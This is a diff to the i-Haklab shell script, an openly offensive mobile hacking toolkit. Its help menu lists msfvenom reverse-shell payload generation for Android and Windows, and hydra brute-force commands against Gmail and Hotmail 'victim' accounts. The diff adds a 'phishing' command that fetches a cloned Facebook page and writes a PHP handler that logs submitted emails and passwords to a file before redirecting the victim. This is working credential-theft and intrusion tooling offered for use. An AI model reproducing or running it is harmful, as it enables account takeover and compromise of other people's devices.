@@ -79,8 +79,8 @@ Arguments  |    Options     |    Description
 ╰─help─────➤────────────────➤ Show this help menu
 ╰─list─────➤────────────────➤ List all available tools/frameworks
 ╰─show─────➤──tools/books───➤ Show details about specific tool and books availables to be downloaded
-    |		╰─────|─────➤ example : i-Haklab show bettercap
-    |		      ╰─────➤ example : i-Haklab show books
+|   |		╰─────|─────➤ example : i-Haklab show bettercap
+|   |		      ╰─────➤ example : i-Haklab show books
 |   ╰──────➤──tutorials/QG──➤ Show tutorials and Quick Guides availables
 ╰─install──➤───tool─name────➤ Install tools or frameworks
 ╰─remove───➤───tool─name────➤ Remove tools or frameworks
@@ -94,7 +94,7 @@ Arguments  |    Options     |    Description
            |       |        |
 	   |       |        |
    [--] Automatitation Arguments [--]
-Arguments  |    options     |    Description
+Arguments  |    Options     |    Description
 ╰─handler──➤──file.rc name──➤ Start handler on msfconsole with previous setting
 ╰───apk────➤──inlan/outlan──➤ Create a coded payload apk with msfvenom
 |               ╰─────|─────➤ LPORT=4546 Payload=android/meterpreter/reverse_tcp apk=inlan.apk
@@ -112,14 +112,16 @@ Arguments  |    options     |    Description
 |                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
 |                             LHOST=serveo.net file=outlan.exe
 ╰─shodan───➤────────────────➤ Search vulnerable servers using metasploit with shodan
-╰─bfmail───➤──email─passwd──➤ Start a brute force attack wiyh hydra tool at email(hotmail/gmail) account
-|   ╰──────➤─────gmail──────➤ example: i-Haklab bfgmail victim@gmail.com passwords.txt
-|   ╰──────➤──hotmail/live──➤ example: i-Haklab bfgmail victim@live.com passwords.txt
+╰─bfmail───➤──email─passwd──➤ Start a brute force attack with hydra tool at email(hotmail/gmail) account
+|    ╰─────➤─────gmail──────➤ example: i-Haklab bfgmail victim@gmail.com passwords.txt
+|    ╰─────➤──hotmail/live──➤ example: i-Haklab bfgmail victim@live.com passwords.txt
 ╰──bfftp───➤─user─passwd─ip─➤ Start a brute force attack with hydra at ftp server
 |    ╰─────➤────────────────➤ example: i-Haklab bfftp users.txt passwords.txt 0.0.0.0
 ╰forwarding➤────────────────➤ Start a SSH client to request TCP port forwarding from server and proxy.
      ╰─────➤──port_number───➤ Set a specific port number (default 4546 or 80 for rooted device)
 |    ╰─────➤───subdomain────➤ Set a specitic subdomain | example: i-Haklab forwarding <myport> <my-subdomain>
+╰─phishing─➤──site─redirect─➤ Clone a specific website for phishing tests
+     ╰─────➤────────────────➤ example: i-Haklab mfacebook m.facebook.com
 |__________________________________________________________________________________________\n\n"
 elif [ $1 = list ]; then
 	banner
@@ -494,7 +496,7 @@ elif [ $1 = forwarding ] && [ $2 ] && [ $3 ]; then
 			printf "$Y\n[!] using default$W : $LPORT\n"
 		fi
 		printf "$G"
-		$(which lt) -p $LPORT -s $3 --print-requests
+		$(which lt) -h "http://serverless.social" -p $LPORT -s $3 --print-requests
         fi
 elif [ $1 = handler ] && [ -z $2 ]; then
 	banner
@@ -613,6 +615,26 @@ elif [ $1 = bfftp ] && [ $2 ] && [ $3 ] && [ $4 ]; then
 		chk-hydra
                 hydra -L $2 -P $3 $4 ftp
         fi
+elif [ $1 = phishing ] && [ -z $2 ];then
+	printf "$R[w]->$W Phishing argument needs a website as an option1"
+elif [ $1 = phishing ] && [ $2 ] && [ -z $3 ]; then
+	printf "$R[w]->$W Phishing argument needs a redirect site as an option2"
+elif [ $1 = phishing ] && [ $2 ] && [ $3 ]; then
+	if [ -e $iHAKLAB/.set/phishing/$2 ]; then
+		TMP_PATH=$PREFIX/var/service/php/$2
+		if [ ! -d $TMP_PATH ]; then
+			mkdir -p $TMP_PATH
+		fi
+		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$SITE.html -O $TMP_PATH/index.html > /dev/null 2>&1
+		echo "<?php" > $TMP_PATH/post.php
+		echo "header('Location: https://$3');" >> $TMP_PATH/post.php
+		echo "if (!empty($\_POST['email'])) {file_put_contents("usernames.txt", "Account: " . \$_POST['email'] . " Pass: " . \$_POST['pass'] . "\n", FILE_APPEND);" >> $TMP_PATH/post.php
+		echo "}" >> $TMP_PATH/post.php
+		echo "" >> $TMP_PATH/post.php
+		echo "exit();" >> $TMP_PATH/post.php
+	else
+		printf "$R[w]->$W This website has not been included yet"
+	fi
 else
 	printf "$R[w]->$W Invalid argument $1 $R|$W Use help to main menu\n"
 fi
